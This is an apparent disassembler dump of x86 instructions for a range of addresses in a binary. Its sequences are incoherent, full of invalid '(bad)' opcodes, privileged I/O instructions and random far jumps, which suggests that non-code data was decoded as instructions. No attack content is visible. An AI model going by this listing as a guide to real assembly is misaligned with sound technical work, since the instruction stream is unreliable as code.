  4145f3:	inc    edx
  4145f4:	inc    ebp
  4145f5:	dec    esi
  4145f6:	adc    eax,0xbcc68652
  4145fb:	int3   
  4145fc:	sbb    BYTE PTR [eax+0x7877bca7],0xa7
  414603:	into   
  414604:	sub    eax,0x2408a62c
  414609:	inc    ecx
  41460a:	push   edi
  41460b:	fbstp  TBYTE PTR [edi]
  41460d:	mov    ecx,0x165192
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xa9
  414681:	arpl   ax,dx
  414683:	hlt    
  414684:	cmc    
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0x48000001
  41468d:	sbb    ch,BYTE PTR [ebx+0x25]
  414690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414691:	pop    es
  414692:	xor    dh,0xba
  414695:	push   es
  414696:	push   0xffffffef
  414698:	enter  0xfd32,0x2e
  41469c:	stos   BYTE PTR es:[edi],al
  41469d:	or     eax,0xea1d61c8
  4146a2:	push   ds
  4146a3:	mov    ch,0xf1
  4146a5:	ds (bad) 
  4146a7:	pusha  
  4146a8:	pop    es
  4146a9:	hlt    
  4146aa:	out    dx,eax
  4146ab:	and    esi,DWORD PTR [ebp-0x27b16c73]
  4146b1:	jae    0x4146da
  4146b3:	dec    esi
  4146b4:	mov    bh,0x4a
  4146b6:	int3   
  4146b7:	js     0x4146c0
  4146b9:	add    al,0x84
  4146bb:	push   esi
  4146bc:	or     esi,edi
  4146be:	push   esp
  4146bf:	rcl    DWORD PTR [edx+0x6],cl
  4146c2:	and    al,0x89
  4146c4:	sar    DWORD PTR [ecx],0x4b
  4146c7:	jl     0x41468e
  4146c9:	mov    ebp,0x7b3c20f5
  4146ce:	in     eax,dx
  4146cf:	xchg   esi,eax
  4146d0:	jno    0x414655
  4146d2:	pop    esp
  4146d3:	(bad)
  4146d7:	inc    ebp
  4146d8:	iret   
  4146d9:	cmp    dl,BYTE PTR ds:0x31b1bdb2
  4146df:	xor    ecx,DWORD PTR [eax+0x5197a425]
  4146e5:	retf   0xfa27
  4146e8:	scas   al,BYTE PTR es:[edi]
  4146e9:	xchg   ecx,eax
  4146ea:	adc    edx,DWORD PTR [ecx+ebp*1-0x37]
  4146ee:	jp     0x414710
  4146f0:	mov    esp,0xa7f8d0f4
  4146f5:	aad    0x30
  4146f7:	mov    ch,0x33
  4146f9:	inc    edx
  4146fa:	mov    edx,0xf3f963f9
  4146ff:	jae    0x41477b
  414701:	out    dx,al
  414702:	adc    ch,0xc0
  414705:	mov    ah,0xf9
  414707:	daa    
  414708:	add    DWORD PTR [edx],ebp
  41470a:	fnclex 
  41470c:	jmp    0x414753
  41470e:	push   ds
  41470f:	vhaddps xmm3,xmm3,XMMWORD PTR [edx+0x2c]
  414714:	leave  
  414715:	cmp    BYTE PTR [esi+0x28],ch
  414718:	cld    
  414719:	push   edi
  41471a:	push   esi
  41471b:	scas   al,BYTE PTR es:[edi]
  41471c:	shl    DWORD PTR [ebx-0x45f30f48],0xe3
  414723:	nop
  414724:	aam    0x42
  414726:	adc    al,0x5c
  414728:	mov    al,ds:0x48da15ff
  41472d:	dec    esi
  41472e:	push   esp
  41472f:	pop    ebx
  414730:	sub    dh,ch
  414732:	in     eax,0x5
  414734:	iret   
  414735:	lock fisub DWORD PTR [esi-0x2e]
  414739:	dec    edx
  41473a:	je     0x414736
  41473c:	xchg   esp,eax
  41473d:	(bad)  
  41473e:	mov    esp,0xfd22ede0
  414743:	arpl   WORD PTR [edx+0x3e345ebd],si
  414749:	xchg   ecx,edx
  41474b:	in     al,dx
  41474c:	push   esp
  41474d:	adc    eax,0x3e60712e
  414752:	add    ebp,DWORD PTR [ebp+0x2f]
  414755:	push   esp
  414756:	test   al,0x2b
  414758:	jmp    0x414760
  41475a:	call   0x4b1e:0xfafc7d74
  414761:	jmp    0x9a77:0xb4b9cb45
  414768:	lds    eax,FWORD PTR [ecx]
  41476a:	outs   dx,DWORD PTR ds:[esi]
  41476b:	fidiv  DWORD PTR [eax-0x283a1315]
  414771:	and    BYTE PTR [ebx+edi*8],0x8d
  414775:	shr    eax,0xeb
  414778:	test   eax,0x600460f6
  41477d:	add    eax,0xe92b4048
  414782:	rcl    DWORD PTR [eax-0x15],cl
  414785:	lahf   
  414786:	inc    esp
  414787:	mov    eax,ds:0x1f2bc653
  41478c:	test   BYTE PTR [eax],0xa0
  41478f:	jecxz  0x4147c3
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x412715ed
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0xf0000001
  41480d:	inc    ebx
  41480e:	(bad)  
  41480f:	jmp    0x1a6245cd
  414814:	and    BYTE PTR [eax+0x6a3da632],bl
  41481a:	mov    esi,0xbecfcf3
  41481f:	(bad)  
  414820:	lahf   
  414821:	jge    0x41485f
  414823:	scas   al,BYTE PTR es:[edi]
  414824:	jb     0x4147ed
  414826:	out    0x1b,eax
  414828:	sub    ah,ch
  41482a:	mov    eax,DWORD PTR [ebx-0x5f]
  41482d:	stos   DWORD PTR es:[edi],eax
  41482e:	out    0x82,eax
  414830:	mov    WORD PTR [esi-0x32],?
  414833:	rol    eax,cl
  414835:	ret    
  414836:	sbb    eax,esp
  414838:	(bad)  
  414839:	int    0x44
  41483b:	daa    
  41483c:	bound  ebx,QWORD PTR ss:[esi-0xd]
  414840:	retf   0x932c
  414843:	jo     0x414860
  414845:	pushf  
  414846:	pop    edi
  414847:	and    al,0xe3
  414849:	je     0x41489e
  41484b:	sub    DWORD PTR [esi+eax*1-0x16fc778a],ecx
  414852:	cdq    
  414853:	inc    ecx
  414854:	xor    eax,0xd6aad792
  414859:	pop    esi
  41485a:	push   ebp
  41485b:	out    0x10,eax
  41485d:	gs lahf 
  41485f:	xlat   BYTE PTR ds:[ebx]
  414860:	aas    
  414861:	sbb    eax,0x32325cc0
  414866:	scas   eax,DWORD PTR es:[edi]
  414867:	inc    ebx
  414868:	jmp    0xe837:0x3c73c8c2
  41486f:	sub    BYTE PTR [ebx+edx*1-0x50],dl
  414873:	rcr    BYTE PTR [edx-0x6e],0x36
  414877:	sbb    edi,DWORD PTR [ecx]
  414879:	pop    esi
  41487a:	pusha  
  41487b:	pop    ecx
  41487c:	gs ss mov dh,0x33
  414880:	push   0xffffffd7
  414882:	jmp    DWORD PTR [esi-0x481e80bb]
  414888:	jp     0x414907
  41488a:	mov    ebp,0x4c41d081
  41488f:	fldcw  WORD PTR [eax-0x6d7b9bff]
  414895:	jl     0x4148c3
  414897:	xchg   DWORD PTR [edi-0x35],esp
  41489a:	retf   
  41489b:	mov    ch,0x27
  41489d:	push   edx
  41489e:	mov    ds:0xd863d3ac,al
  4148a3:	fcom   QWORD PTR ds:0x76a98557
  4148a9:	fwait
  4148aa:	mov    ecx,0xa10e5420
  4148af:	mov    ds:0x3cf32d75,al
  4148b4:	in     eax,0xa0
  4148b6:	fmul   st,st(3)
  4148b8:	mov    ah,0xbf
  4148ba:	iret   
  4148bb:	push   esp
  4148bc:	mov    WORD PTR ds:0xa1a97b94,es
  4148c2:	mov    ?,WORD PTR [edx+0x6a]
  4148c5:	xchg   DWORD PTR [edx-0x2c],eax
  4148c8:	inc    esi
  4148c9:	shl    BYTE PTR [ebx+0x5a18e009],1
  4148cf:	(bad)  
  4148d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148d1:	inc    di
  4148d3:	dec    eax
  4148d4:	push   eax
  4148d5:	and    ecx,0xbbb4cb9a
  4148db:	sbb    al,0x3c
  4148dd:	lahf   
  4148de:	ret    
  4148df:	jmp    0xffe:0xb919cae4
  4148e6:	xchg   ecx,eax
  4148e7:	stos   BYTE PTR es:[edi],al
  4148e8:	xchg   edx,eax
  4148e9:	dec    ebp
  4148ea:	shr    BYTE PTR [ecx+0x37],1
  4148ed:	add    BYTE PTR [ebx],0xb8
  4148f0:	push   ebx
  4148f1:	mov    ebp,0xd463cba4
  4148f6:	inc    ecx
  4148f7:	(bad)  
  4148f8:	xor    BYTE PTR [esi-0x2789e62d],dl
  4148fe:	adc    BYTE PTR ds:0x86a6120c,al
  414904:	rol    DWORD PTR [edx],cl
  414906:	test   al,0x51
  414908:	out    dx,al
  414909:	std    
  41490a:	add    BYTE PTR [edx],ah
  41490c:	push   ss
  41490d:	push   esp
  41490e:	cli    
  41490f:	not    edi
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	fwait
  414981:	xor    DWORD PTR [esi+eax*4+0xd8ff],edx
  414988:	add    eax,0xa5000001
  41498d:	lds    ecx,FWORD PTR [edi]
  41498f:	sbb    BYTE PTR [esi-0x25],0x41
  414993:	jb     0x4149c3
  414995:	call   0x63d63d6f
  41499a:	inc    edx
  41499b:	push   ds
  41499c:	jecxz  0x414a09
  41499e:	je     0x4149cb
  4149a0:	adc    DWORD PTR [esi],ecx
  4149a2:	arpl   WORD PTR [ebx+edx*4+0x70],bp
  4149a6:	add    BYTE PTR [edi+ecx*8],al
  4149a9:	iret   
  4149aa:	fmul   DWORD PTR [esp+edx*8]
  4149ad:	lock dec esp
  4149af:	icebp  
  4149b0:	add    esp,edx
  4149b2:	repz or ecx,edi
  4149b5:	jp     0x41494c
  4149b7:	push   0x3f
  4149b9:	rol    ebp,cl
  4149bb:	jmp    0xa2cafca8
  4149c0:	fs add cl,bh
  4149c3:	ds mov al,0x8
  4149c6:	mov    ah,0x1e
  4149c8:	add    al,0x4b
  4149ca:	lea    esi,[ebx+0x27]
  4149cd:	or     BYTE PTR [ecx+0x63afface],0xcb
  4149d4:	add    ch,BYTE PTR [esi+0x55]
  4149d7:	xchg   esi,eax
  4149d8:	fist   DWORD PTR [edi+edi*4+0x23]
  4149dc:	in     eax,0x1a
  4149de:	(bad)  
  4149df:	ins    DWORD PTR es:[edi],dx
  4149e0:	out    dx,al
  4149e1:	bnd ret 
  4149e3:	ins    DWORD PTR es:[edi],dx
  4149e4:	jnp    0x414a01
  4149e6:	mov    ebx,0x2e05c35a
  4149eb:	mov    edx,0xdfd3278c
  4149f0:	rcl    dh,0x22
  4149f3:	stos   DWORD PTR es:[edi],eax
  4149f4:	add    ebp,DWORD PTR [ebx+0x23]
  4149f7:	dec    ebp
  4149f8:	daa    
  4149f9:	leave  
  4149fa:	push   ecx
  4149fb:	add    ebx,ecx
  4149fd:	popf   
  4149fe:	and    DWORD PTR [ecx-0x7d],esp
  414a01:	xlat   BYTE PTR ds:[ebx]
  414a02:	mov    cl,BYTE PTR [ebx]
  414a04:	add    ch,cl
  414a06:	out    0x86,eax
  414a08:	sbb    bh,BYTE PTR [ecx+0x4d01881b]
  414a0e:	mov    dl,0x3d
  414a10:	xor    eax,0x79db133c
  414a15:	pushf  
  414a16:	test   eax,0xa8c63c1f
  414a1b:	fisttp WORD PTR [ecx]
  414a1d:	aaa    
  414a1e:	test   BYTE PTR [ecx-0x2d],0x79
  414a22:	pop    edi
  414a23:	xlat   BYTE PTR ds:[ebx]
  414a24:	stos   DWORD PTR es:[edi],eax
  414a25:	fild   QWORD PTR [esi]
  414a27:	dec    edx
  414a28:	sub    BYTE PTR [edx-0x1b],dh
  414a2b:	(bad)  
  414a2c:	je     0x4149b1
  414a2e:	aam    0xd3
  414a30:	nop
  414a31:	mov    edx,0xef48537c
  414a36:	push   DWORD PTR [edx]
  414a38:	popa   
  414a39:	and    ebx,ecx
  414a3b:	nop
  414a3c:	xor    cl,BYTE PTR [edx]
  414a3e:	(bad)  [eax+0x1e8d681f]
  414a44:	xchg   ecx,eax
  414a45:	jecxz  0x414a46
  414a47:	and    DWORD PTR ds:0x18d5,ebx
  414a4c:	mov    ecx,0xf0fa6a86
  414a51:	into   
  414a52:	xchg   edi,eax
  414a53:	loopne 0x4149f6
  414a55:	sub    eax,0xe53ff5fd
  414a5a:	dec    edx
  414a5b:	or     bl,ch
  414a5d:	or     DWORD PTR [ecx-0x29],eax
  414a60:	dec    ebp
  414a61:	ret    0x3bc2
  414a64:	in     eax,dx
  414a65:	mov    dh,0x85
  414a67:	or     DWORD PTR [ebp-0x49244523],esi
  414a6d:	adc    eax,0x80c0058f
  414a72:	fidiv  WORD PTR [edi]
  414a74:	fcom   DWORD PTR [edx-0x5a22b4f1]
  414a7a:	pop    ebx
  414a7b:	cmp    cl,cl
  414a7d:	inc    edi
  414a7e:	mov    eax,0x71ffe204
  414a83:	add    BYTE PTR [ecx],0x5a
  414a86:	mov    ebx,0x40ed7f62
  414a8b:	es cdq 
  414a8d:	and    al,0x6b
  414a8f:	inc    edx
  414a90:	or     BYTE PTR [eax],al
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx-0x30dc9c27]
  414b02:	jns    0x414b09
  414b04:	add    al,0xda
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0x69000001
  414b0d:	cdq    
  414b0e:	pusha  
  414b0f:	xlat   BYTE PTR ds:[ebx]
  414b10:	aas    
  414b11:	cs repnz aaa 
  414b14:	cwde   
  414b15:	pop    eax
  414b16:	push   ds
  414b17:	shl    ebx,1
  414b19:	add    bl,0xa5
  414b1c:	lahf   
  414b1d:	pop    es
  414b1e:	dec    ebp
  414b1f:	pop    ebx
  414b20:	adc    ebx,edx
  414b22:	wrmsr  
  414b24:	out    0x7,eax
  414b26:	repnz sub dh,0xd7
  414b2a:	neg    DWORD PTR [eax-0x14a4c18e]
  414b30:	and    DWORD PTR [esi+0x1f],esi
  414b33:	mov    eax,0x3877bf9a
  414b38:	mov    edi,0x90d4b881
  414b3d:	add    eax,ebx
  414b3f:	sub    al,0x3c
  414b41:	adc    esp,DWORD PTR [edi-0x184aecd7]
  414b47:	into   
  414b48:	ins    BYTE PTR es:[edi],dx
  414b49:	out    0x24,eax
  414b4b:	jno    0x414b18
  414b4d:	jp     0x414af4
  414b4f:	pop    esp
  414b50:	adc    al,0x2
  414b52:	jg     0x414b61
  414b54:	mov    ebx,0xa19ec403
  414b59:	inc    esi
  414b5a:	(bad)  
  414b5b:	xchg   edi,eax
  414b5c:	in     al,dx
  414b5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b5e:	jns    0x414b8d
  414b60:	cmc    
  414b61:	das    
  414b62:	(bad)  
  414b64:	lahf   
  414b65:	xchg   esi,eax
  414b66:	dec    esp
  414b67:	ret    0xcdfe
  414b6a:	into   
  414b6b:	mov    edx,0xe90a3fe2
  414b70:	cdq    
  414b71:	push   edi
  414b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b73:	aas    
  414b74:	call   0xd36b:0x4053679c
  414b7b:	pop    esi
  414b7c:	mov    ds:0xea172aac,al
  414b81:	sub    al,0xdd
  414b83:	sub    BYTE PTR [edx],ah
  414b85:	inc    BYTE PTR [edx]
  414b87:	xchg   edx,eax
  414b88:	jae    0x414be0
  414b8a:	bound  edi,QWORD PTR [eax]
  414b8c:	jge    0x414bfa
  414b8e:	enter  0x4d81,0x7c
  414b92:	stos   DWORD PTR es:[edi],eax
  414b93:	ret    0x45d
  414b96:	and    BYTE PTR [ebx],0xee
  414b99:	stos   DWORD PTR es:[edi],eax
  414b9a:	sub    DWORD PTR [ebp+eax*1+0x7219a730],ebp
  414ba1:	pop    esp
  414ba2:	(bad)  
  414ba3:	(bad)  
  414ba5:	mov    es,WORD PTR [ebx]
  414ba7:	add    eax,0x96dcc94f
  414bac:	mov    BYTE PTR [ecx],dl
  414bae:	mov    bl,BYTE PTR [esi+0x30]
  414bb1:	imul   eax,ebx,0x5d
  414bb4:	fwait
  414bb5:	das    
  414bb6:	in     al,0x99
  414bb8:	mov    DWORD PTR [edi+0x56ec0b9b],edi
  414bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bbf:	in     eax,dx
  414bc0:	cmp    al,0xa2
  414bc2:	lahf   
  414bc3:	xchg   cl,al
  414bc5:	ja     0x414bb2
  414bc7:	and    eax,0x1e445e21
  414bcc:	lods   eax,DWORD PTR ds:[esi]
  414bcd:	jecxz  0x414b61
  414bcf:	lods   al,BYTE PTR ds:[esi]
  414bd0:	jo     0x414c2b
  414bd2:	adc    DWORD PTR [esi+0x4],ecx
  414bd5:	(bad)  
  414bd6:	mov    WORD PTR [ecx+0x1f],ss
  414bd9:	jo     0x414c12
  414bdb:	aas    
  414bdc:	jno    0x414c59
  414bde:	push   es
  414bdf:	pop    ds
  414be0:	in     al,0x69
  414be2:	mov    al,ds:0x7e648231
  414be7:	inc    ebx
  414be8:	mov    edx,0x10c0e3b9
  414bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bee:	(bad)  ds:0x15fe43e4
  414bf4:	xlat   BYTE PTR ss:[ebx]
  414bf6:	outs   dx,DWORD PTR ds:[esi]
  414bf7:	adc    al,0x59
  414bf9:	das    
  414bfa:	jb     0x414c68
  414bfc:	mov    bl,0x12
  414bfe:	push   edx
  414bff:	leave  
  414c00:	aaa    
  414c01:	ins    BYTE PTR es:[edi],dx
  414c02:	mov    ebx,0x8a59870f
  414c07:	(bad)  
  414c08:	jge    0x414c85
  414c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c0b:	or     edi,DWORD PTR [edi+0x77b19f1a]
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    edx,DWORD PTR cs:[ecx+0x992bb25]
  414c85:	fild   DWORD PTR [eax]
  414c87:	add    BYTE PTR ds:0x70000001,al
  414c8d:	sbb    al,0x91
  414c8f:	jns    0x414d10
  414c91:	xchg   edx,eax
  414c92:	cmp    BYTE PTR [esi],cl
  414c94:	mov    ebp,ss
  414c96:	mov    esp,0xb3fa7245
  414c9b:	cdq    
  414c9c:	imul   ebp,ecx,0xffffffde
  414c9f:	je     0x414cdd
  414ca1:	loop   0x414cca
  414ca3:	std    
  414ca4:	(bad)  
  414ca5:	push   ebx
  414ca6:	add    eax,0xf4628c31
  414cab:	dec    ebx
  414cac:	stc    
  414cad:	es xor eax,0x6d8cc276
  414cb3:	jo     0x414c63
  414cb5:	add    BYTE PTR [ecx+0x8d08b24],bh
  414cbb:	push   eax
  414cbc:	into   
  414cbd:	or     BYTE PTR [ecx-0x7013fea8],dl
  414cc3:	ror    cl,0xd9
  414cc6:	adc    BYTE PTR [edx+ebx*8],ah
  414cc9:	lock push ebx
  414ccb:	test   eax,0x8b540ed5
  414cd0:	sub    ch,bh
  414cd2:	jae    0x414d35
  414cd4:	ss pop ds
  414cd6:	jne    0x414d56
  414cd8:	jbe    0x414c6f
  414cda:	adc    edi,ecx
  414cdc:	in     eax,0xb1
  414cde:	(bad)
  414ce1:	shl    BYTE PTR [edi+ebx*4],cl
  414ce4:	adc    DWORD PTR [esi+0x29],ebx
  414ce7:	cmp    bl,BYTE PTR [ecx+0x2f]
  414cea:	xor    ebx,DWORD PTR [edi-0x2c]
  414ced:	add    al,0x12
  414cef:	cmp    DWORD PTR ds:0x2b4bffaf,esi
  414cf5:	add    eax,DWORD PTR [edx+eax*8-0x47de56dc]
  414cfc:	fnstsw WORD PTR [esi]
  414cfe:	lds    ebp,FWORD PTR [edi]
  414d00:	into   
  414d01:	cmpps  xmm3,xmm6,0x20
  414d05:	add    DWORD PTR [ecx+0x36ba7b73],ecx
  414d0b:	arpl   WORD PTR ds:0x8785813,ax
  414d11:	xor    al,0x1a
  414d13:	jmp    0x655c:0xdb453315
  414d1a:	push   0x59
  414d1c:	arpl   WORD PTR [edi],bp
  414d1e:	jae    0x414d0f
  414d20:	xchg   ecx,eax
  414d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d22:	cmp    eax,0xeb885c38
  414d27:	aas    
  414d28:	and    al,dh
  414d2a:	pop    ebp
  414d2b:	inc    eax
  414d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d2d:	jle    0x414ceb
  414d2f:	push   cs
  414d30:	xor    edx,0x66
  414d33:	fidiv  DWORD PTR [ecx]
  414d35:	dec    ebp
  414d36:	sub    al,0x4e
  414d38:	mov    ecx,0x7d86e976
  414d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d3e:	and    cl,BYTE PTR [eax-0x5711c94e]
  414d44:	adc    eax,0xaf343451
  414d49:	fcmovbe st,st(7)
  414d4b:	push   ds
  414d4c:	cmp    ah,BYTE PTR [esi-0x5c]
  414d4f:	xchg   ebp,eax
  414d50:	ficom  DWORD PTR [eax-0x7140d]
  414d56:	xor    eax,0x1ce47fef
  414d5b:	sbb    eax,0x2e9a5b47
  414d60:	mov    bh,0x3d
  414d62:	call   0x2df0:0xef9b0c12
  414d69:	mov    bh,BYTE PTR [edi]
  414d6b:	fmul   DWORD PTR [edx]
  414d6d:	cld    
  414d6e:	pop    esp
  414d6f:	or     BYTE PTR [ebp-0x73],cl
  414d72:	icebp  
  414d73:	xor    DWORD PTR [eax-0x1e227f6c],esi
  414d79:	adc    BYTE PTR [ecx-0x57aff4f],bl
  414d7f:	pusha  
  414d80:	mov    ch,BYTE PTR [edx-0x15]
  414d83:	test   BYTE PTR [bp-0x5a35],cl
  414d88:	lea    esp,[esi+0x3a]
  414d8b:	les    edx,FWORD PTR ds:0xb1d032a9
	...
  414df1:	add    BYTE PTR [eax],al
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x14bd4eaa
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0xf3000001,al
  414e0d:	(bad)  
  414e0f:	dec    edi
  414e10:	and    eax,0xfbffeb8b
  414e15:	xor    eax,0xe81de856
  414e1a:	ss in  eax,0xd4
  414e1d:	out    dx,eax
  414e1e:	fmul   QWORD PTR [esi-0x71]
  414e21:	jns    0x414dde
  414e23:	jg     0x414e93
  414e25:	adc    ah,BYTE PTR [edi+ebp*1-0x1bede18f]
  414e2c:	data16 mov al,0x0
  414e2f:	jb     0x414e75
  414e31:	std    
  414e32:	or     edi,ebp
  414e34:	mov    ch,0xf8
  414e36:	sub    al,0x3c
  414e38:	inc    edx
  414e39:	fs dec edi
  414e3b:	adc    cl,BYTE PTR [ecx]
  414e3d:	jg     0x414dea
  414e3f:	dec    edx
  414e40:	pop    DWORD PTR [edx+edi*4-0x3d0a0d2f]
  414e47:	inc    ebp
  414e48:	retf   
  414e49:	stos   BYTE PTR es:[edi],al
  414e4a:	(bad)  
  414e4b:	and    cl,bl
  414e4d:	fsave  [ecx+0x7d68d8d1]
  414e54:	daa    
  414e55:	clc    
  414e56:	mov    eax,ds:0x5ea8bb7d
  414e5b:	xchg   edi,eax
  414e5c:	inc    ebp
  414e5d:	pushf  
  414e5e:	mov    ebp,0xa5035870
  414e63:	test   al,0xd9
  414e65:	shr    DWORD PTR [ebp+0x45682b3a],cl
  414e6b:	mov    BYTE PTR [esi+0x1a573013],al
  414e71:	mov    ebp,0x5ecdadb5
  414e76:	inc    esp
  414e77:	jne    0x414e8d
  414e79:	push   eax
  414e7a:	call   0x169d:0xe370a684
  414e81:	or     eax,0xc5df1424
  414e86:	mov    dh,cl
  414e88:	xchg   DWORD PTR ds:0xff5f285f,eax
  414e8e:	and    esi,DWORD PTR [eax]
  414e90:	jle    0x414ef9
  414e92:	push   eax
  414e93:	mov    eax,0x1a29f3fe
  414e98:	dec    ebx
  414e99:	sub    al,BYTE PTR [edx]
  414e9b:	push   ecx
  414e9c:	fidiv  DWORD PTR [edi]
  414e9e:	xchg   BYTE PTR [eax],ch
  414ea0:	ret    0x3500
  414ea3:	xor    edx,ebp
  414ea5:	mov    al,ds:0x4d024d5b
  414eaa:	jae    0x414e88
  414eac:	inc    esi
  414ead:	adc    cl,dl
  414eaf:	pop    edx
  414eb0:	ins    BYTE PTR es:[edi],dx
  414eb1:	in     al,dx
  414eb2:	jg     0x414ee3
  414eb4:	jbe    0x414e89
  414eb6:	and    edi,DWORD PTR [esi+0x6099e7d1]
  414ebc:	dec    esp
  414ebd:	ins    BYTE PTR es:[edi],dx
  414ebe:	cmp    BYTE PTR [edx],dh
  414ec0:	mov    DWORD PTR [edi-0x49f866e5],ecx
  414ec6:	cmp    eax,0xe5ed1664
  414ecb:	xlat   BYTE PTR ds:[ebx]
  414ecc:	or     al,BYTE PTR [ebx]
  414ece:	icebp  
  414ecf:	fstp   TBYTE PTR [edx-0x44c7b2f8]
  414ed5:	sbb    BYTE PTR [edi+edx*4],dl
  414ed8:	pusha  
  414ed9:	in     eax,dx
  414eda:	hlt    
  414edb:	ins    BYTE PTR es:[edi],dx
  414edc:	inc    esp
  414edd:	stos   DWORD PTR es:[edi],eax
  414ede:	mov    ds:0x81e536d6,al
  414ee3:	mov    ah,0x21
  414ee5:	aas    
  414ee6:	cmp    esi,ebx
  414ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ee9:	mov    al,0x47
  414eeb:	push   0x59
  414eed:	jle    0x414e86
  414eef:	jg     0x414edd
  414ef1:	add    ch,BYTE PTR [edi-0x55b8d904]
  414ef7:	sbb    esi,DWORD PTR [eax-0x284d696c]
  414efd:	in     al,dx
  414efe:	push   0xa0cae26e
  414f03:	ds push esp
  414f05:	mov    edi,DWORD PTR [esi-0x58627fe0]
  414f0b:	call   esi
  414f0d:	inc    edx
  414f0e:	sbb    esp,DWORD PTR [eax+0x4b]
	...
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0x9228aaa9
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0x37000001
  414f8d:	in     eax,0xe9
  414f8f:	push   0x7db61717
  414f94:	xchg   ecx,eax
  414f95:	xchg   edx,eax
  414f96:	rcl    DWORD PTR [edi],cl
  414f98:	stos   DWORD PTR es:[edi],eax
  414f99:	mov    bl,0x88
  414f9b:	int3   
  414f9c:	jl     0x414f84
  414f9e:	fld    DWORD PTR [ebp+0x64a9792d]
  414fa4:	inc    ecx
  414fa5:	mov    dl,0x2
  414fa7:	jb     0x414f97
  414fa9:	dec    ecx
  414faa:	push   0x1cd49313
  414faf:	or     DWORD PTR [esi],ebx
  414fb1:	test   eax,0xfb44df8c
  414fb6:	int    0xc9
  414fb8:	mov    edx,0x2ac7602
  414fbd:	sub    dl,0x48
  414fc0:	std    
  414fc1:	pop    edi
  414fc2:	aad    0x8c
  414fc4:	add    eax,DWORD PTR ds:0x7a8c9455
  414fca:	and    al,0x22
  414fcc:	lods   al,BYTE PTR ds:[esi]
  414fcd:	or     esp,DWORD PTR [ebp-0x1b2c7199]
  414fd3:	push   ds
  414fd4:	dec    eax
  414fd5:	xor    al,BYTE PTR [ecx+0x600b5a01]
  414fdb:	lods   al,BYTE PTR ds:[esi]
  414fdc:	xlat   BYTE PTR ds:[ebx]
  414fdd:	fcmovnbe st,st(6)
  414fdf:	aas    
  414fe0:	cmp    eax,DWORD PTR [ebx]
  414fe2:	pusha  
  414fe3:	arpl   WORD PTR [ebp-0xdeee629],bp
  414fe9:	xor    esi,DWORD PTR [eax]
  414feb:	sbb    cl,BYTE PTR [ebx+0x3a1c7477]
  414ff1:	in     al,0x32
  414ff3:	sbb    DWORD PTR [esi],ebp
  414ff5:	popa   
  414ff6:	mov    esi,esp
  414ff8:	test   bh,bh
  414ffa:	out    dx,eax
  414ffb:	push   0x2b
  414ffd:	dec    ebp
  414ffe:	(bad)  
  414fff:	mov    cl,0x36
  415001:	outs   dx,DWORD PTR ds:[esi]
  415002:	enter  0xf9d4,0xd7
  415006:	dec    ebx
  415007:	icebp  
  415008:	jge    0x415019
  41500a:	push   cs
  41500b:	xchg   ecx,eax
  41500c:	ja     0x414fc4
  41500e:	cld    
  41500f:	daa    
  415010:	test   edi,ebp
  415012:	mov    DWORD PTR [eax+0x779d1a05],ebx
  415018:	rcl    BYTE PTR [edx+0x74],cl
  41501b:	jno    0x414ff2
  41501d:	test   BYTE PTR [edx+0x2b],bl
  415020:	aad    0xf
  415022:	popa   
  415023:	rcr    edi,1
  415025:	cmp    eax,0x69acff01
  41502a:	mov    WORD PTR [eax+0x69],?
  41502d:	xor    bh,cl
  41502f:	cli    
  415030:	xchg   ebp,eax
  415031:	ins    DWORD PTR es:[edi],dx
  415032:	test   DWORD PTR [ecx+0x41],eax
  415035:	mov    ah,0x17
  415037:	cmovg  ebx,eax
  41503a:	xor    esp,0x2a4b35f1
  415040:	jmp    0x415039
  415042:	inc    esi
  415043:	sbb    eax,0xccdd0398
